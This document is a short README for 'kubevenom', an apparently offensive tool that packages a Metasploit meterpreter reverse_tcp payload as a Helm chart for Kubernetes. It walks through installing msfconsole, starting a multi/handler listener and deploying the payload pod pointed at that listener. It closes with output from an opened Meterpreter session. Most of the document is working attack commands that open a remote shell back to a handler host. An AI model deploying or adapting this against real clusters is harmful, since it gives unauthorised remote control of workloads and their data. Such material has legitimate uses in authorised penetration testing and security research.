# kubevenom - Metasploit Payload for Kubernetes

## Demo

### 1. Install Metasploit Console

```sh
helm dep update ./metasploit
helm upgrade --create-namespace -i -n metasploit metasploit ./metasploit
```

### 2. Run MetaSploit Console

```sh
export MSF_POD_NAME=$(kubectl get pods --namespace metasploit -l "app.kubernetes.io/name=metasploit,app.kubernetes.io/instance=metasploit" -o jsonpath="{.items[0].metadata.name}")

kubectl --namespace metasploit exec -it $MSF_POD_NAME -- msfconsole.sh
```

### 3. Setup Metasploit Handler
    - `msf6 > use exploit/multi/handler`
    >  [*] Using configured payload generic/shell_reverse_tcp msf6`

    - `exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp`

    > PAYLOAD => linux/x64/meterpreter/reverse_tcp msf6 exploit(multi/handler) > run
    
    > [] Started reverse TCP handler on 10.244.0.138:4444 [] Sending stage 

### 4. Deploy Kubevenom

Export msfconsole (receive handler) network and install Kubevenom Helm Chart

```sh
export MSF_POD_IPADDRESS=$(kubectl get pods --namespace metasploit -l "app.kubernetes.io/name=metasploit,app.kubernetes.io/instance=metasploit" -o jsonpath="{.items[0].status.podIP}")

export MSF_POD_PORT=$(kubectl get pods --namespace metasploit -l "app.kubernetes.io/name=metasploit,app.kubernetes.io/instance=metasploit" -o jsonpath="{.items[0].spec.containers[0].ports[0].containerPort}")

helm upgrade --create-namespace -i -n metasploit kubevenom ./kubevenom --set lport=$MSF_POD_PORT --set lhost=$MSF_POD_IPADDRESS
```

### 3. On Your *msfconsole*

```shell
[*] Sending stage (3012548 bytes) to 10.244.0.167
[*] Meterpreter session 1 opened (10.244.0.165:4444 -> 10.244.0.167:58724) at 2021-10-20 07:36:16 +0000

meterpreter > ps

Process List
============

 PID  PPID  Name       Arch    Path
 ---  ----  ----       ----    ----
 1    0     kubevenom  x86_64  /kubevenom

```
